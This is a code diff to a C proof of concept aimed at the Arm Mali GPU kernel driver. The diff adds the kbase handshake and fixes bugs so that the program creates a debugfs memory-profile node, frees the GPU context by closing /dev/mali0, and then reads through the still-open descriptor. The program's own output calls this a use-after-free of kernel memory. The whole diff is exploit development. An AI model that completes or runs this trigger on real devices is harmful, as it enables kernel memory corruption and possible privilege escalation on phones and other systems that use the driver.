@@ -25,13 +25,16 @@
 #include <sys/prctl.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/sysmacros.h>
 #include <time.h>
 #include <dirent.h>
 #include <ctype.h>
 
+#include "../tools/mali_handshake.h"
+
 #define DEBUG_OUTPUT_ENABLED
 
-#define SYSCHK(x) { \
+#define SYSCHK(x) ({ \
   typeof(x) __res = (x); \
   if (__res == (typeof(x))-1) { \
     fprintf(stderr, "\n[FATAL] System call failed: %s\n", strerror(errno)); \
@@ -39,7 +42,7 @@
     exit(1); \
   } \
   __res; \
-}
+})
 
 #define DEBUG_LOG(msg, ...) \
   do { \
@@ -48,8 +51,9 @@
       struct tm *t = localtime(&now); \
       char timestamp[20]; \
       strftime(timestamp, sizeof(timestamp), "%H:%M:%S", t); \
-      printf("[%s %s] %s\n", timestamp, (geteuid() == 0 ? "ROOT" : "USER"), \
-             msg, ##__VA_ARGS__); \
+      printf("[%s %s] ", timestamp, (geteuid() == 0 ? "ROOT" : "USER")); \
+      printf(msg, ##__VA_ARGS__); \
+      printf("\n"); \
     } \
   } while(0)
 
@@ -71,11 +75,12 @@ struct kbase_ioctl_mem_profile_add {
     _IOC(_IOC_WRITE, KBASE_IOCTL_TYPE, 27, sizeof(struct kbase_ioctl_mem_profile_add))
 
 #define MAX_COOKIE_PATH 256
+#define MIN(a, b) (((a) < (b)) ? (a) : (b))
 
 // Function prototypes
-int find_mali_device(char *out, size_t outsz);
-int find_kctx_dir(char *out, size_t outsz, const char *devname);
-const char* get_debugfs_node_type(const char* path);
+static int find_mali_device(char *out, size_t outsz);
+static int find_kctx_dir(char *out, size_t outsz, const char *devname);
+static const char* get_debugfs_node_type(const char* path);
 
 int main(int argc, char **argv) {
     int debug_enabled = 1;
@@ -123,6 +128,19 @@ int main(int argc, char **argv) {
     
     int mali_fd = SYSCHK(open(dev_path, O_RDWR));
     printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);
+
+    // Step 2b: complete the Kbase handshake (VERSION_CHECK + SET_FLAGS).
+    // Without a kcontext, MEM_PROFILE_ADD fails with EPERM and no per-kctx
+    // debugfs directory exists.
+    DEBUG_LOG("Completing Kbase setup (VERSION_CHECK + SET_FLAGS)");
+    printf("\n[STEP 2b] Kbase Handshake\n");
+    printf("  - Purpose: Create the kcontext required by MEM_PROFILE_ADD\n");
+    if (mali_kbase_setup(mali_fd) < 0) {
+        printf("  -> FAILURE: handshake failed: %s\n", strerror(errno));
+        close(mali_fd);
+        return 1;
+    }
+    printf("  -> SUCCESS: kcontext created\n");
     
     // Step 4: Execute MEM_PROFILE_ADD ioctl (creates debugfs files)
     DEBUG_LOG("Creating mem_profile debugfs node via KBASE_IOCTL_MEM_PROFILE_ADD");
@@ -235,7 +253,7 @@ int main(int argc, char **argv) {
     printf("  - Critical action: Close() the /dev/mali0 file descriptor\n");
     printf("  - Effect: kbase_context_debugfs_term() -> debugfs_remove_recursive()\n");
     printf("  - Critical: debugfs_remove_recursive() does NOT invalidate open fds!\n");
-    printf("  - Result: File descriptor at %d still holds i_private == kctx\n");
+    printf("  - Result: File descriptor at %d still holds i_private == kctx\n", prof_fd);
     printf("  - Status: kctx is now vfree'd but fd reference persists\n");
     
     close(mali_fd);
@@ -258,8 +276,7 @@ int main(int argc, char **argv) {
     n = read(prof_fd, buf, sizeof(buf));
     
     if (n < 0) {
-        printf("  -> Read() error: %s (may have raced - read may have completed)
-", strerror(errno));
+        printf("  -> Read() error: %s (may have raced - read may have completed)\n", strerror(errno));
         printf("     Note: Race conditions in kernel may cause read to fail gracefully\n");
     } else {
         printf("  -> SUCCESS: Read() returned %zd bytes\n", n);
